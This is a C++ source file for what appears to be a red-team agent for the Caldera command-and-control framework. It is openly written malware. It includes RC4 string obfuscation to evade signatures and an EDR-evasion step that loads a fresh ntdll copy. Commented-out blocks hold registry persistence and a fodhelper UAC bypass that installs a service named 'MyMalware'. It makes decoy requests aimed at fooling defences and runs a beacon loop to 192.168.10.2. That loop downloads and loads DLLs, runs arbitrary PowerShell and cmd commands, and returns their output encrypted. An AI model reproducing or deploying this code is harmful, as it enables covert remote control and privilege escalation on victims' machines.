#include "main.h"

string ModuleCommands = "";  // Global string to store commands from dynamically loaded modules.
HMODULE Module = NULL;  // Global handle for dynamically loaded module (DLL).

string privilage = "user";

// ===========================  obfoscate signature  ===========================

#define MSGBOXDEF int (_stdcall *)(HWND, LPCTSTR, LPCTSTR, UINT)

struct APIs {
    int(_stdcall* MessageBoxAPI)(
        HWND    hWnd,
        LPCTSTR lpText,
        LPCTSTR lpCaption,
        UINT    uType
        );

};

APIs* GetAPIs() {
    APIs* apis = (APIs*)malloc(sizeof(APIs)); // Allocating memory for APIs structure

    const char* MessageboxEncrypted = "\x1c\x4e\x33\x0a\xc6\xd7\x22\x3f\x7c\xb6\xf4";
    int Length = strlen(MessageboxEncrypted);

    HMODULE User32DLL = LoadLibraryA("User32.dll"); // Load the User32.dll library
    apis->MessageBoxAPI = (MSGBOXDEF)GetProcAddress(User32DLL, (char*)RC4((char*)"Calderaint=1@1&1%", (unsigned char*)MessageboxEncrypted, Length));

    return apis;
}

// ===========================  obfoscate signature  ===========================

int main(int argc, char* argv[])
{
    // ===========================  EDR Evasion  ===========================

    DWORD FileSize = 0;
    char* NTDLL = ReadNTDLLFile(FileSize);
    printf("NTDLL File: %s, Size: %d", NTDLL, FileSize);

    char TempPath[MAX_PATH] = { 0 };
    GetTempPath(MAX_PATH, TempPath);
    string Filename = TempPath + (char)"\\ntdll_new.tmp";
    HANDLE TmpFile = CreateFile(Filename.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD WrittenBytes = 0;
    if (WriteFile(TmpFile, NTDLL, FileSize, &WrittenBytes, NULL) == TRUE)
        printf("File written Successfully");

    CloseHandle(TmpFile);

    HMODULE NewNTDLL = LoadLibrary(Filename.c_str());
    DWORD ntCreateFileAPI = (DWORD)GetProcAddress(NewNTDLL, "NtCreateFile");
    printf("New NTDLL Address: %x, ntCreateFile: %x\n", NewNTDLL, ntCreateFileAPI);

    return 0;

    // ===========================  EDR Evasion  ===========================

   /*
   // =====================  Persistance  ===========================

    char Filename[MAX_PATH] = { 0 };
    DWORD nLength = GetModuleFileName(NULL, Filename, MAX_PATH) + 1;

    APIs* apis = GetAPIs();

    (*apis->MessageBoxAPI)(0, "This is my Agent", "Red Team", 0);

    // RC4 password:= {Calderaint=1@1&1%} ==> To Hex ==>> EncryptedRegKey
    const char* EncryptedRegKey = "\x02\x64\x06\x2d\xf0\xf1\x15\x38\x4f\x83\xdc\x3a\x6f\xc7\x91\x1f\x7b\x59\x2a\x8d\x40\x44\xb8\xf9\xae\x4c\x68\x06\x36\xd7\xeb\xd3\x77\x08\x29\x53\xd7\xbe\xb5\xfe\x11\x42\x98\xdd\x08";
    char*  DecryptedRegKey = (char*)RC4((char*)"Calderaint=1@1&1%", (unsigned char*)EncryptedRegKey, strlen(EncryptedRegKey));
    // printf("DecryptedRegKey: %s", DecryptedRegKey);
    
    UpdateRegistry(HKEY_CURRENT_USER, DecryptedRegKey, (char*)"RedTeam", (char*)Filename, nLength, REG_SZ, false);
    free(DecryptedRegKey);

    // =====================  Persistance  ===========================

    // ===========================  privilage escalation  ===========================

    if (argc < 2) {
        string command = string(Filename) + " -a";
        UpdateRegistry(HKEY_CURRENT_USER, (char*)"SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command", NULL, (char*)command.c_str(), command.length(), REG_SZ, true);
        UpdateRegistry(HKEY_CURRENT_USER, (char*)"SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command", (char*)"DelegateExecute", (char*)"", 0, REG_SZ, true);
        system("Fodhelper.exe");
    }
    else if(argv[1] == "-a")
    {
        cout << "Runing as Administrator\n";
        privilage = "Elevated";
        InstallService((char*)"MyMalware");
    }
    */

    // ===========================  privilage escalation  ===========================

    string paw = "";  // 'paw' will store a unique identifier returned from the server for each client.

    while (true)  // Infinite loop to continuously send and receive instructions from the server.
    {
        /*
        // ===========================  Random request to trick Ai and All defence  ===========================

        // Weather
        HINTERNET hSessionFake = SendRequest("192.168.10.2", 8888, "/index.html", "GET", NULL);
        InternetCloseHandle(hSessionFake);
        hSessionFake = SendRequest("192.168.10.2", 8888, "/gui/img/favicon.png", "GET", NULL);
        InternetCloseHandle(hSessionFake);
        hSessionFake = SendRequest("192.168.10.2", 8888, "/gui/jquery.js", "GET", NULL);
        InternetCloseHandle(hSessionFake);
        hSessionFake = SendRequest("192.168.10.2", 8888, "/gui/img/weather.jpg", "GET", NULL);
        InternetCloseHandle(hSessionFake);
        hSessionFake = SendRequest("192.168.10.2", 8888, "/dashboard.html", "GET", NULL);
        InternetCloseHandle(hSessionFake);
        hSessionFake = SendRequest("192.168.10.2", 8888, "/gui/css/lib/fa-all.min.css", "GET", NULL);
        InternetCloseHandle(hSessionFake);
        hSessionFake = SendRequest("192.168.10.2", 8888, "/gui/css/lib/custom-bulma.css", "GET", NULL);
        InternetCloseHandle(hSessionFake);
        hSessionFake = SendRequest("192.168.10.2", 8888, "/gui/jquery/jquery.js", "GET", NULL);
        InternetCloseHandle(hSessionFake);
        */

        // ===========================  Random request to trick Ai and All defence  ===========================

        // ===========================  Constructing to server  ===========================
        
        // Constructing a JSON message with basic system and agent information.
        JSON msg = {
                "pid", "1200",
                "server", "192.168.10.2",
                "platform", "windows",
                "host", "RedTeam  ",
                "username", "infected",
                "architecture", "amd64",
                "privilege", privilage.c_str(),
                "executors", json::Array("psh", "cmd")
        };

        if (!paw.empty())
            msg["paw"] = paw;

        // ===========================  Constructing to server  ===========================

        // ===========================  encrypt and encode caldera message  ===========================

        char* encryptedMSG = (char*)RC4((char*)"Calderaint=1@1&1%", (unsigned char*)msg.dump().c_str(), msg.dump().length());

        // Base64-encode the JSON message before sending.
        char* encodedmsg = b64encode((char*)encryptedMSG, msg.dump().length());

        // string fullmsg = "path=dashboard.html&page=3&apitoken=" + string(encodedmsg);
        printf("Our Encoded Msg: %s\n", encodedmsg);

        // ===========================  encrypt and encode caldera message  ===========================

        // ===========================  Send the encoded message to the server  ===========================

        // Send the encoded message to the server via a POST request to the '/beacon' endpoint.
        // weather.html ==>> HINTERNET hSession = SendRequest("192.168.10.2", 8888, "/weather", "POST", fullmsg.c_str()); //encodedmsg

        HINTERNET hSession = SendRequest("192.168.10.2", 8888, "/beacon", "POST", encodedmsg);
        if (hSession)
        {
            printf("Data has been sent successfully\n");  // If request is successful.
        }
        else
        {
            printf("Error in sending data\n");  // If the request fails.
        }

        // ===========================  Send the encoded message to the server  ===========================

        // ===========================  Get the server's response and its length  ===========================

        // Get the server's response and its length.
        DWORD Length = 0;
        char* Response = GetResponse(hSession, &Length);
        printf("Caldera Response: %s\n", Response);  // Print the raw server response for debugging.
        if (Response == NULL || Length == 0)  // If no response or length is zero, continue with the next iteration.
            {
                Sleep(100 * 30);
                continue;
            }

        InternetCloseHandle(hSession);  // Close the HTTP session.

       /*  weather.html
       * =====================================================================================================
       <p id="instructions" style="display:none">{{ instructions }}</p>
       int pos = 0;
        char* ExtractedResponse = ExtractString(Response, (char*)"<p id=\"instructions\" style=\"display:none\">", (char*)"</p>", pos);
        //Length = strlen(ExtractedResponse);

        ========================================================================================================
        */
        if (Length == 2)
        {
            Sleep(100 * 30);
            continue;
        }

        // ===========================  Get the server's response and its length  ===========================

        // ===========================  Decode the server's response  ===========================

        // Base64-decode the server's response.
        char* DecodedResponse = b64decode(Response, Length);
        DWORD NewLenght = b64d_size(Length);
        char* DEcryptedResponse = (char*)RC4((char*)"Calderaint=1@1&1%", (unsigned char*)DecodedResponse, NewLenght);
        DEcryptedResponse[NewLenght] = '\0';
        string response = DEcryptedResponse;  // Convert decoded char* response to a string for easier manipulation.

        // Clean up the JSON response by removing escape characters.
        response = regex_replace(response, regex("\\\\"), "");
        response = regex_replace(response, regex("\"\\["), "[");
        response = regex_replace(response, regex("\"\\{"), "{");
        response = regex_replace(response, regex("\\]\""), "]");
        response = regex_replace(response, regex("\\}\""), "}");
        printf("Caldera Decoded Response: %s\n", response.c_str());  // Print the decoded and cleaned response.

        // Load the response as a JSON object.
        JSON res = JSON::Load(response);

        // Extract the 'paw' and 'sleep' values from the server response.
        paw = res["paw"].ToString();
        int sleep = res["sleep"].ToInt();
        cout << "paw: " << paw << "\n";  // Print the 'paw' value.
        cout << "sleep: " << sleep << "\n";  // Print the sleep time between iterations.

        // ===========================  Decode the server's response  ===========================

        // ===========================  Iterate over each instruction in the server's response  ===========================

        // Iterate over each instruction in the server's response.
        for (int i = 0; i < res["instructions"].length(); i++)
        {
            // Extract instruction ID, command, and executor from the response.
            string id = res["instructions"][i]["id"].ToString();
            string command = res["instructions"][i]["command"].ToString();
            string executor = res["instructions"][i]["executor"].ToString();
            cout << "id: " << id << "\n";  // Print the instruction ID.
            cout << "command: " << command << "\n";  // Print the command.
            cout << "executor: " << executor << "\n";  // Print the executor type.

            // Base64-decode the command.
            char* decodecmd = b64decode((char*)command.c_str(), command.length());
            cout << "Decoded command: " << decodecmd << "\n";  // Print the decoded command.

            // Initialize variables to store the command and the output of its execution.
            string cmd = "";
            char* output = NULL;
            size_t length = 0;

            // Check if the executor is PowerShell (psh).
            if (executor == "psh")
            {
                string fullcmd = decodecmd;  // Store the decoded command in a string.

                // ===========================  Check download command  ===========================
                
                // If the command starts with "download ", treat it as a file download command.
                if (fullcmd.rfind("download ", 0) == 0)
                {
                    DWORD Length = 0;
                    // Extract the filename from the command.
                    string filename = fullcmd.substr(strlen("download "));
                    // Construct the full URL to download the file.
                    string FullURL = "http://192.168.10.2:8888/gui/" + filename;
                    char* FileData = DownloadFile(FullURL.c_str(), &Length, NULL);  // Download the file data.

                    // ===========================  Open a file and write the downloaded data to it  ===========================
                    
                    FILE* f;
                    errno_t err = fopen_s(&f, filename.c_str(), "wb");
                    if (f != 0) {
                        return NULL;
                    }
                    fwrite(FileData, 1, Length, f);
                    fclose(f);  // Close the file after writing.

                    // ===========================  Open a file and write the downloaded data to it  ===========================

                    // Load the downloaded file as a module (DLL).
                    Module = LoadLibrary(filename.c_str());
                    // Get the address of the 'Install' function in the DLL.
                    FARPROC Install = GetProcAddress(Module, "Install");
                    // Call the 'Install' function and store its output in ModuleCommands.
                    ModuleCommands = (char*)Install();
                    cout << ModuleCommands << "\n";
                }
                // If the command contains previously loaded module commands.
                else if (fullcmd.find(ModuleCommands, 0) != -1)
                {
                    // Get the function address from the module based on the command.
                    FARPROC ModuleFunc = GetProcAddress(Module, fullcmd.c_str());
                    if (ModuleFunc != NULL)
                    {
                        output = (char*)ModuleFunc();  // Execute the function and store the output.
                        cout << "Command Output: " << output << "\n";
                        length = strlen(output);  // Get the length of the output.
                    }
                    else
                    {
                        cout << "Error Finding Function: " << fullcmd.c_str() << "\n";
                    }
                }
                else
                {
                    // If not a module command, encode the PowerShell command into Base64 for execution.
                    wstring unicodecmd = ConvertAnsiToWide(decodecmd);
                    char* b64cmd = b64encode((char*)unicodecmd.c_str(), unicodecmd.length() * 2);
                    cmd = "powershell.exe -nop -enc " + string(b64cmd);  // Construct the PowerShell command.
                    cout << "Our Command = " << cmd << "\n";

                    output = ExecuteApplication(cmd, length);  // Execute the PowerShell command and capture the output.
                }
            }
            // Check if the executor is Command Prompt (cmd).
            else if (executor == "cmd")
            {
                cmd = "cmd.exe /c " + string(decodecmd);  // Construct the Command Prompt command.
                cout << "Our Command = " << cmd << "\n";

                output = ExecuteApplication(cmd, length);  // Execute the Command Prompt command and capture the output.
            }

            // If no output or output length is zero, set the output to "None".
            if (output == NULL || length == 0)
            {
                output = (char*)"None";
                length = strlen(output);
            }
            else
                cout << "Output = " << output << "\n";  // Print the command output.

            // ===========================  Construct a JSON object to send the results back to the server  ===========================

            JSON results = {
                "id", id,  // Include the instruction ID.
                "output", b64encode(output,length),  // Base64-encode the output.
                "status", 0,  // Indicate successful execution (status = 0).
                "pid", 0  // Process ID is set to 0 (default).
            };

            // Prepare a JSON message with 'paw' and the results to send back.
            JSON msg = {
                "paw", paw,
                "results", json::Array((results))
            };
            cout << msg.dump() << "\n";  // Print the message for debugging.

            char* encryptedMSG = (char*)RC4((char*)"Calderaint=1@1&1%", (unsigned char*)msg.dump().c_str(), msg.dump().length());

            // Base64-encode the JSON message before sending.
            char* encodedmsg = b64encode((char*)encryptedMSG, msg.dump().length());

           //  string fullmsg = "path=dashboard.html&page=3&apitoken=" + string(encodedmsg);
            printf("Our Encoded Msg: %s\n", encodedmsg);

            // ===========================  Construct a JSON object to send the results back to the server  ===========================

            // ===========================  Send the encoded message to the server  ===========================
            
            // weather ===>> HINTERNET hSession = SendRequest("192.168.10.2", 8888, "/weather", "POST", fullmsg.c_str());
            
            HINTERNET hSession = SendRequest("192.168.10.2", 8888, "/beacon", "POST", encodedmsg);

            if (hSession)
            {
                printf("Data has been sent successfully\n");  // If the request is successful.
            }
            else
            {
                printf("Error in sending data\n");  // If the request fails.
            }
            InternetCloseHandle(hSession);  // Close the HTTP session.
        }
        // ===========================  Send the encoded message to the server  ===========================

        // ===========================  Iterate over each instruction in the server's response  ===========================

        Sleep(100 * sleep);  // Sleep for the specified time before the next iteration.

    }
}
